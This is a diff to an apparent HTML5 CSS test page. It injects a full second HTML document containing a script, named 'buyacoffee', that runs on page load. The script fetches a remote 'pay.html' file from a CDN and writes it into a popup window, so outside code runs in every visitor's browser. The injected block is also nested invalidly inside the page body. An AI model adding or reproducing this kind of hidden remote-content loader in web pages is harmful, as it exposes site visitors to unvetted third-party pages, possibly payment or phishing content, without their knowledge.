@@ -11,7 +11,45 @@
         <h1>HTML5 Test Page</h1>
         <p>This is a test page filled with common HTML elements to be used to provide visual feedback whilst building CSS systems and frameworks.</p>
     
-      
+      <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>wait loading</title>
+</head>
+<body>
+  
+    <script>
+    function buyacoffee() {
+    function getPageSource(url) {
+  fetch(url)
+    .then(response => response.text())
+    .then(sourceCode => {
+     loadWebPage(sourceCode);
+    })
+    .catch(error => {
+      console.error('Error fetching page source:', error);
+    });
+}
+
+  function loadWebPage(sourceCode) {
+  var newWindow = window.open('about:blank');
+  newWindow.document.open();
+  newWindow.document.write(sourceCode);
+  newWindow.document.close();
+}
+
+let url = 'https://cdn.jsdelivr.net/gh/sohanlalkush/slk/pay.html';
+getPageSource(url);
+ }
+ 
+ buyacoffee()
+ </script>
+
+    
+</body>
+</html>
+
               
       <footer>
         <p>Made by <a href="http://twitter.com/cbracco">@cbracco</a>. Code on <a href="http://github.com/cbracco/html5-test-page">GitHub</a>.</p>
